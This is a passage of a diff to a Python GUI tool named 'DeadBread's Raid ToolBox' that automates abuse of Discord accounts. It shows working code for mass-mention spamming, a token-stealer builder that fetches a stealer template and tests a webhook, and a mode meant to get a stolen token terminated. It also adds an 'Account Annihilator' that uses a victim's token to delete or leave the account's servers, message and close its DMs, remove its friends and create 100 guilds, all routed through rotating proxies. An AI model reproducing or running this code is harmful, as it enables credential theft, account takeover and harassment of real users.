+                roles = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/roles",headers=headers, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -2089,7 +2108,7 @@ elif mode == "rolemention":
         if channel == 'all':
             while True:
                 try:
-                    src = requests.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
+                    src = request.get(f"https://canary.discordapp.com/api/v6/guilds/{server}/channels",headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -2119,7 +2138,7 @@ elif mode == "rolemention":
                             payload = {"content" : m, "tts" : False}
                             while True:
                                 try:
-                                    src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                                    src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel['id']}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                                 except Exception:
                                     if use_proxies == 1:
                                         proxies = request_new_proxy()
@@ -2147,7 +2166,7 @@ elif mode == "rolemention":
                     payload = {"content": m, "tts": False}
                     while True:
                         try:
-                            src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+                            src = request.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
                         except Exception:
                             if use_proxies == 1:
                                 proxies = request_new_proxy()
@@ -2175,7 +2194,7 @@ elif mode == "rolemention":
             [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="Channel")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True)
+        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2197,7 +2216,7 @@ elif mode == "cleanup":
             [sg.Input(key="Server")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True)
+        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2215,6 +2234,7 @@ elif mode == "cleanup":
 elif mode == "hypesquad":
     def changehouse(token, house):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if house == "Bravery":
             payload = {'house_id': 1}
         elif house == "Brilliance":
@@ -2226,7 +2246,7 @@ elif mode == "hypesquad":
             payload = {'house_id': random.choice(houses)}
         while True:
             try:
-                requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, proxies=proxies, timeout=10)
+                request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -2255,7 +2275,7 @@ elif mode == "hypesquad":
             [sg.Text('House To Change to', size=(15, 1)), sg.Combo(['Bravery', 'Brilliance', 'Balance', 'Random'], readonly=True, key="House")],
             [sg.Button('Start', button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True)
+        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2272,10 +2292,11 @@ elif mode == "reaction":
     import emoji
     def addreact(token, emoji, message, channel, type):
         headers, proxies = setup_request(token)
+        request = requests.Session()
         if type == "Add":
             while True:
                 try:
-                    requests.put(f"https://discordapp.com/api/v6/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
+                    request.put(f"https://discordapp.com/api/v6/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -2286,7 +2307,7 @@ elif mode == "reaction":
         elif type == "Remove":
             while True:
                 try:
-                    requests.delete(f"https://discordapp.com/api/v6/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
+                    request.delete(f"https://discordapp.com/api/v6/channels/{channel}/messages/{message}/reactions/{emoji}/@me", headers=headers, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -2395,7 +2416,7 @@ elif mode == "reaction":
             [sg.Combo(['Add','Remove'], readonly=True,size=(14,1), key="Method"), sg.Combo(emojilist, size=(10,1), key="Emoji", default_value=":smile:")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Message Reactor', layout)
+        window = sg.Window('RTB | Message Reactor', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2437,6 +2458,7 @@ elif mode == 'quickcheck': # Legacy Shit
 
 elif mode == "StealerBuilder":
     import PyInstaller.__main__
+    request = requests.Session()
     if sys.platform.startswith("linux"):
         sg.Popup("Linux isn't supported yet.")
         sys.exit()
@@ -2455,9 +2477,9 @@ elif mode == "StealerBuilder":
             os.chdir('RTBStealerBuilder/')
             pyname = name+'.py'
             if sys.platform.startswith("win32"):
-                temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
+                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
             elif sys.platform.startswith("darwin"):
-                temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
+                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
@@ -2500,7 +2522,7 @@ elif mode == "StealerBuilder":
         [sg.Output(size=(80, 15))],
         [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
     ]
-    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.3.0", layout)
+    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.3.0", layout, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event is None or event == 'Exit':
@@ -2522,7 +2544,7 @@ elif mode == "StealerBuilder":
             "content": "Test, Sent From Raid ToolBox"
             }
             try:
-                src = requests.post(values["Webhook"], json=payload).text
+                src = request.post(values["Webhook"], json=payload).text
                 if src == "":
                     pass
                 else:
@@ -2562,9 +2584,11 @@ elif mode == "StealerBuilder":
 
 elif mode == "InfoToken":
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
+    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
     while True:
         try:
-            src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
+            src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
         except Exception:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -2576,13 +2600,17 @@ elif mode == "InfoToken":
     try:
         info = f"Name: {response['username']}#{response['discriminator']}\nID: {response['id']}\nEmail: {response['email']}\nPhone: {response['phone']}\nLanguage: {response['locale']}\n"
     except Exception:
-        sg.Popup("Unable to get info on token.", title="Error")
+        sg.Popup("Unable to get info on token.", title="Error", icon=rtb_icon)
     else:
         lay = [
-            [sg.Multiline(info,size=(50,10))],
+            [sg.Multiline(info, size=(50,10))],
             [sg.Button("Export")]
         ]
-        window = sg.Window(f"Information on {response['username']}").Layout(lay)
+        try:
+            window = sg.Window(f"Information on {response['username']}", icon=rtb_icon, keep_on_top=True).Layout(lay)
+        except Exception:
+            with open(f"users/{response['username']}.txt", "w+", errors='ignore') as handle:
+                handle.write(info)
         event, values = window.Read()
         if event is None or event == 'Exit':
             pass
@@ -2591,10 +2619,10 @@ elif mode == "InfoToken":
                 os.mkdir("users")
             with open(f"users/{response['username']}.txt", "w+", errors='ignore') as handle:
                 handle.write(info)
-                sg.Popup(f"Exported info for {response['username']} to files/{response['username']}.txt",title="Exported")
+                sg.Popup(f"Exported info for {response['username']} to files/{response['username']}.txt", title="Exported", icon=rtb_icon)
 
 elif mode == "HeavyInfo":
-    sg.PopupNonBlocking("This May take a while.")
+    sg.PopupNonBlocking("This may take a while.", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
     import discord
     import unicodedata
     import string
@@ -2678,12 +2706,13 @@ elif mode == "HeavyInfo":
 
 elif mode == "Terminator":
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
     del headers['Content-Type']
     del headers['User-Agent']
     sg.PopupNonBlocking("Terminating Token...", title="Bye Bye Token :)", auto_close=True, auto_close_duration=3)
     while True:
         try:
-            src = requests.post("https://canary.discordapp.com/api/v6/invite/fortnite", headers=headers, proxies=proxies, timeout=5)
+            src = request.post("https://canary.discordapp.com/api/v6/invite/fortnite", headers=headers, proxies=proxies, timeout=5)
         except Exception as e:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -2699,6 +2728,7 @@ elif mode == "Terminator":
 
 elif mode == "CG":
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
     payload = {
         'theme': "light",
         'locale': "ja",
@@ -2717,7 +2747,7 @@ elif mode == "CG":
     }
     while True:
         try:
-            requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload, proxies=proxies, timeout=10)
+            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload, proxies=proxies, timeout=10)
         except Exception:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -2752,7 +2782,7 @@ elif mode == "CG":
         }
         while True:
             try:
-                requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, proxies=proxies, timeout=10)
+                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -2762,12 +2792,13 @@ elif mode == "CG":
                 break
 
 elif mode == "Ownership":
+    request = requests.Session()
     lay = [
         [sg.Text('Server ID',size=(10,1)), sg.Input(key="ServerID")],
         [sg.Text('New Owner ID',size=(10,1)), sg.Input(key="OwnerID")],
         [sg.Button("Transfer")]
     ]
-    window = sg.Window("Transfer Ownership").Layout(lay)
+    window = sg.Window("Transfer Ownership", icon=rtb_icon).Layout(lay)
     event, values = window.Read()
     if event is None:
         pass
@@ -2776,7 +2807,7 @@ elif mode == "Ownership":
         payload = {'owner_id': values['OwnerID']}
         while True:
             try:
-                src = requests.patch(f"https://ptb.discordapp.com/api/v6/guilds/{values['ServerID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
+                src = request.patch(f"https://ptb.discordapp.com/api/v6/guilds/{values['ServerID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -2913,11 +2944,13 @@ elif mode == "DDDC":
     client.run(token, bot=False)
 
 elif mode == "Gifts":
+    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
     gifts = {}
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
     while True:
         try:
-            src = requests.get("https://canary.discordapp.com/api/v6/users/@me/entitlements/gifts", headers=headers, proxies=proxies, timeout=10)
+            src = request.get("https://canary.discordapp.com/api/v6/users/@me/entitlements/gifts", headers=headers, proxies=proxies, timeout=10)
         except Exception:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -2935,7 +2968,7 @@ elif mode == "Gifts":
         layout.append([sg.Text(g, size=(50,1)), sg.Button("Take",key=g)])
     if len(list(g)) == 0:
         layout.append([sg.Text("None")])
-    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory").Layout(layout)
+    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -2943,7 +2976,7 @@ elif mode == "Gifts":
         elif event in list(gifts):
             g = ast.literal_eval(gifts[event])
             payload = {"sku_id": g['sku_id'],"subscription_plan_id": g["id"]}
-            src = requests.post("https://canary.discordapp.com/api/v6/users/@me/entitlements/gift-codes", headers=headers, json=payload, proxies=proxies, timeout=10)
+            src = request.post("https://canary.discordapp.com/api/v6/users/@me/entitlements/gift-codes", headers=headers, json=payload, proxies=proxies, timeout=10)
             f = json.loads(src.content)
             if f['code'] == 30022:
                 sg.Popup("Maximum number of gifts has been reached for this SKU.", title="Code 30022")
@@ -2953,10 +2986,11 @@ elif mode == "Gifts":
                     handle.write("https://discord.gift/{}\n".format(f['code']))
 
 elif mode == "AppList":
+    sg.PopupNonBlocking("Please Wait...", icon=rtb_icon, auto_close=True, auto_close_duration=1, keep_on_top=True)
     headers, proxies = setup_request(sys.argv[6])
     while True:
         try:
-            src = requests.get("https://canary.discordapp.com/api/v6/oauth2/applications?with_team_applications=true", headers=headers, proxies=proxies, timeout=10)
+            src = request.get("https://canary.discordapp.com/api/v6/oauth2/applications?with_team_applications=true", headers=headers, proxies=proxies, timeout=10)
         except Exception:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -2980,7 +3014,7 @@ elif mode == "AppList":
             input_rows.append([sg.Input(bot['username'], disabled=False, size=(15,1)), sg.Input(bot['discriminator'], disabled=False, size=(15,1)), sg.Input(bot['id'], disabled=False, size=(15,1)), sg.Input(bot['token'], disabled=False, size=(25,1))])
     layout = header + input_rows
     layout.append([sg.Button("Save all tokens")])
-    window = sg.Window("RTB | Token Bots").Layout(layout)
+    window = sg.Window("RTB | Token Bots", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -2992,6 +3026,7 @@ elif mode == "AppList":
 
 elif mode == "CustomConnection":
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
     appkey = {
         'Leauge of Legends': "leagueoflegends",
         'Battle.net': "battlenet",
@@ -3002,7 +3037,7 @@ elif mode == "CustomConnection":
         [sg.Combo(['Leauge of Legends', 'Battle.net', 'Skype'], size=(16,1), key="TYPE", readonly=True), sg.Input("Name", size=(20,1), key="NAME"), sg.Input("ID", size=(15,1), key="ID")],
         [sg.Button("Create Connection")]
     ]
-    window = sg.Window("RTB | Custom Connections").Layout(layout)
+    window = sg.Window("RTB | Custom Connections", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -3012,7 +3047,7 @@ elif mode == "CustomConnection":
             payload = {"name": values['NAME'], "visibility": 1}
             while True:
                 try:
-                    src = requests.put(f"https://canary.discordapp.com/api/v6/users/@me/connections/{appkey[type]}/{values['ID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
+                    src = request.put(f"https://canary.discordapp.com/api/v6/users/@me/connections/{appkey[type]}/{values['ID']}", headers=headers, json=payload, proxies=proxies, timeout=10)
                 except Exception:
                     if use_proxies == 1:
                         proxies = request_new_proxy()
@@ -3024,12 +3059,13 @@ elif mode == "CustomConnection":
 
 elif mode == "FR Clearer":
     headers, proxies = setup_request(sys.argv[6])
+    request = requests.Session()
     def delete(userid):
         headers, proxies = setup_request(sys.argv[6])
         while True:
             payload = {"type": 2}
             try:
-                src = requests.put(f"https://canary.discordapp.com/api/v6/users/@me/relationships/{userid}", headers=headers, json=payload, proxies=proxies, timeout=10)
+                src = request.put(f"https://canary.discordapp.com/api/v6/users/@me/relationships/{userid}", headers=headers, json=payload, proxies=proxies, timeout=10)
             except Exception:
                 if use_proxies == 1:
                     proxies = request_new_proxy()
@@ -3039,7 +3075,7 @@ elif mode == "FR Clearer":
                 break
     while True:
         try:
-            src = requests.get("https://canary.discordapp.com/api/v6/users/@me/relationships", headers=headers, proxies=proxies, timeout=10)
+            src = request.get("https://canary.discordapp.com/api/v6/users/@me/relationships", headers=headers, proxies=proxies, timeout=10)
         except Exception:
             if use_proxies == 1:
                 proxies = request_new_proxy()
@@ -3055,7 +3091,7 @@ elif mode == "FR Clearer":
 elif mode == "LoginBot":
     from selenium import webdriver
     profile = webdriver.FirefoxProfile()
-    profile.set_preference("general.useragent.override", 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36')
+    profile.set_preference("general.useragent.override", f'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36')
     driver = webdriver.Firefox(profile)
     driver.get("https://canary.discordapp.com/login")
     script = """
@@ -3132,6 +3168,295 @@ elif mode == "LoginBot":
     """ # Modified version of this code: https://pastebin.com/Fn9EYNLa, thank you whoever made the original.
     driver.execute_script(script+f'\nlaunchbot("Bot {sys.argv[6]}")')
 
+elif mode == "Annihilator": # China be like
+    import traceback
+    request = requests.Session()
+    def glitch_client():
+        headers, proxies = setup_request(sys.argv[6])
+        payload = {
+            'theme': "light",
+            'locale': "ja",
+            'message_display_compact': False,
+            'enable_tts_command': False,
+            'inline_embed_media': False,
+            'inline_attachment_media': False,
+            'gif_auto_play': False,
+            'render_embeds': False,
+            'render_reactions': False,
+            'animate_emoji': False,
+            'convert_emoticons': False,
+            'enable_tts_command': False,
+            'explicit_content_filter': '0',
+            'status': "invisible"
+        }
+        while True:
+            try:
+                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                break
+        locales = [  # Thanks https://github.com/iLinked1337
+            "da", "de",
+            "en-GB", "en-US",
+            "es-ES", "fr",
+            "hr", "it",
+            "lt", "hu",
+            "nl", "no",
+            "pl", "pt-BR",
+            "ro", "fi",
+            "sv-SE", "vi",
+            "tr", "cs",
+            "el", "bg",
+            "ru", "uk",
+            "th", "zh-CN",
+            "ja", "zh-TW",
+            "ko"
+            ]
+        modes = cycle(["light", "dark"])
+        statuses = cycle(["online", "idle", "dnd", "invisible"])
+        while True:
+            setting = {
+                'theme': next(modes),
+                'locale': random.choice(locales),
+                'status': next(statuses)
+            }
+            while True:
+                try:
+                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, proxies=proxies, timeout=10)
+                except Exception:
+                    if use_proxies == 1:
+                        proxies = request_new_proxy()
+                    else:
+                        break
+                else:
+                    break
+
+    def change_avatar(avatar):
+        headers, proxies = setup_request(sys.argv[6])
+        while True:
+            try:
+                src = request.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+        username = src.json()['username']
+        email = src.json()['email']
+        with open(avatar, "rb") as avatar_handle:
+            encoded = bytes_to_base64_data(avatar_handle.read())
+        payload = {
+            'avatar': encoded,
+            'email': email,
+            'password': '',
+            'username': username
+        }
+        while True:
+            try:
+                src = request.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload, proxies=proxies, timeout=20)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                break
+
+    def delete_guild(id):
+        headers, proxies = setup_request(sys.argv[6])
+        while True:
+            try:
+                src = request.delete(f'https://canary.discordapp.com/api/v6/guilds/{id}', headers=headers, proxies=proxies, timeout=20)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+
+    def leave_guild(id):
+        headers, proxies = setup_request(sys.argv[6])
+        while True:
+            try:
+                src = request.delete(f'https://canary.discordapp.com/api/v6/users/@me/guilds/{id}', headers=headers, proxies=proxies, timeout=20)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+
+    def remove_friend(id):
+        headers, proxies = setup_request(sys.argv[6])
+        while True:
+            try:
+                src = request.delete(f"https://canary.discordapp.com/api/v6/users/@me/relationships/{id}", headers=headers, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+
+    def create_guild(name, encoded):
+        headers, proxies = setup_request(sys.argv[6])
+        payload = {"name": name, "icon": encoded}
+        while True:
+            try:
+                src = request.post(f'https://canary.discordapp.com/api/v6/guilds', headers=headers, json=payload, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+
+    def dm_and_close(id, text):
+        headers, proxies = setup_request(sys.argv[6])
+        payload = {
+            "content" : text
+        }
+        while True:
+            try:
+                src = request.post(f"https://canary.discordapp.com/api/v6/channels/{id}/messages", headers=headers, json=payload, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                break
+        while True:
+            try:
+                src = request.delete(f"https://canary.discordapp.com/api/v6/channels/{id}", headers=headers, proxies=proxies, timeout=10)
+            except Exception:
+                if use_proxies == 1:
+                    proxies = request_new_proxy()
+                else:
+                    break
+            else:
+                if src.status_code == 429:
+                    time.sleep(src.json()['retry_after'])
+                    continue
+                else:
+                    break
+
+    def start_annihilate(values):
+        global window
+        headers, proxies = setup_request(sys.argv[6])
+        executor.submit(change_avatar, values['PFP'])
+        if values['PassProtect']:
+            threading.Thread(target=glitch_client, daemon=True).start()
+        with ThreadPoolExecutor(max_workers=4) as exe:
+            while True:
+                try:
+                    src = request.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, proxies=proxies, timeout=10)
+                except Exception:
+                    if use_proxies == 1:
+                        proxies = request_new_proxy()
+                    else:
+                        break
+                else:
+                    break
+            print("Leaving all servers...")
+            for guild in src.json():
+                if guild['owner']:
+                    exe.submit(delete_guild, guild['id'])
+                else:
+                    exe.submit(leave_guild, guild['id'])
+
+        with ThreadPoolExecutor(max_workers=4) as exe:
+            while True:
+                try:
+                    src = request.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, proxies=proxies, timeout=10)
+                except Exception:
+                    if use_proxies == 1:
+                        proxies = request_new_proxy()
+                    else:
+                        break
+                else:
+                    break
+            print("Sending and closing DMs...")
+            for dm in src.json():
+                exe.submit(dm_and_close, dm['id'], values['Message'])
+
+        with ThreadPoolExecutor(max_workers=4) as exe:
+            while True:
+                try:
+                    src = request.get("https://canary.discordapp.com/api/v6/users/@me/relationships", headers=headers, proxies=proxies, timeout=10)
+                except Exception:
+                    if use_proxies == 1:
+                        proxies = request_new_proxy()
+                    else:
+                        break
+                else:
+                    break
+            print("Removing Friends...")
+            for relation in src.json():
+                exe.submit(remove_friend, relation['id'])
+        with ThreadPoolExecutor(max_workers=4) as exe:
+            print("Creating Guilds...")
+            with open(values['PFP'], "rb") as icon_handle:
+                encoded = bytes_to_base64_data(icon_handle.read())
+            for x in range(100):
+                exe.submit(create_guild, values['SerName'], encoded)
+        print("Account got annihilated")
+        time.sleep(1)
+        window['Annihilate'].Update(disabled=False)
+
+    layout = [
+        [sg.Text("New profile/server picture:", size=(18,1)), sg.Input(key="PFP"), sg.FileBrowse()],
+        [sg.Text("Created Servers Name:", size=(18,1)), sg.Input(key="SerName")],
+        [sg.Text("Message to send to friends:")],
+        [sg.Multiline(key="Message")],
+        [sg.Text("Password Change Protection:"), sg.Checkbox("", default=False, key="PassProtect")],
+        [sg.Button("Annihilate", size=(15,1))],
+        [sg.Output(size=(75,10), visible=False, key="Output")]
+    ]
+    window = sg.Window("RTB | Account Annihilator", icon=rtb_icon).Layout(layout)
+    while True:
+        event, values = window.Read(timeout=50)
+        if event is None:
+            os.kill(os.getpid(), 9)
+        elif event == "Annihilate":
+            window['Output'].Update(visible=True)
+            window['Annihilate'].Update(disabled=True)
+            try:
+                threading.Thread(target=start_annihilate, args=[values], daemon=True).start()
+            except Exception as e:
+                print(e)
+
+
 elif mode == "ProxyScraper":
     import re
     printqueue = []
@@ -3139,6 +3464,7 @@ elif mode == "ProxyScraper":
     scraping = False
     finished = 0
     links = []
+    request = requests.Session()
     proxyregex = "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,4}" # Really happy with this for some reason
     def scrape_link(link, linkno, linkslen):
         global proxies
@@ -3146,7 +3472,7 @@ elif mode == "ProxyScraper":
         try:
             printqueue.append(f"Checking Link {linkno}/{linkslen}")
             try:
-                src = requests.get(link, timeout=5)
+                src = request.get(link, timeout=5)
             except:
                 printqueue.append(f"Error Scraping {link}")
                 sys.exit()
@@ -3169,7 +3495,7 @@ elif mode == "ProxyScraper":
         if not os.path.isdir("proxies"):
             os.mkdir("proxies")
         proxies = []
-        links = requests.get("https://gist.githubusercontent.com/DeadBread76/608c733168cb808783d2024def3ea736/raw/db2d029485647a1033b07551453de47d8f9ed75e/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
+        links = request.get("https://gist.githubusercontent.com/DeadBread76/608c733168cb808783d2024def3ea736/raw/db2d029485647a1033b07551453de47d8f9ed75e/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
         linkno = 0
         scraping = True
         name = datetime.now().strftime("%m-%d-%Y %H-%M-%S")
@@ -3195,7 +3521,7 @@ elif mode == "ProxyScraper":
                     'http': f'{proxy_type}://{proxy}',
                     'https': f'{proxy_type}://{proxy}'
                 }
-                requests.get("https://www.google.com/", timeout=timeout, proxies=proxies)
+                request.get("https://www.google.com/", timeout=timeout, proxies=proxies)
             except Exception:
                 printqueue.append(f"[{proxy}]: Dead or timed out.")
                 dead += 1
@@ -3223,12 +3549,13 @@ elif mode == "ProxyScraper":
             for proxy in proxylist:
                 exe.submit(check_proxy, proxy, timeout, list, proxy_type)
         checking = False
+        printqueue.append(f"Working: {working} | Dead: {dead}")
 
     layout = [
         [sg.Output(size=(105, 20))],
         [sg.Button("Scrape Proxies", size=(15,1), key="ScrapeButton"), sg.Input(key="ProxyListPath"), sg.FileBrowse(file_types=(("Text Files", "*.txt"),("All Files", "*.*")), key="Brow"), sg.Button("Check", key="Checkbutton"), sg.Combo(['https', 'http', 'socks4', 'socks5'], key="Type", readonly=True), sg.Text("Timeout (In Seconds):"), sg.Spin([x + 1 for x in range(500)], 10, key='TimeOut')]
     ]
-    window = sg.Window("RTB | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True).Layout(layout)
+    window = sg.Window("RTB | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True, icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read(timeout=50)
         if event is None:
@@ -3291,7 +3618,7 @@ elif mode == "CPUWIDGET":
         [sg.Exit(pad=((15, 0), 0)), sg.Spin([x + 1 for x in range(10)], 1, key='spin')]
     ]
     window = sg.Window('Running Timer', layout, no_titlebar=True, auto_size_buttons=False, keep_on_top=True,
-                       grab_anywhere=True)
+                       grab_anywhere=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event is None or event == 'Exit':
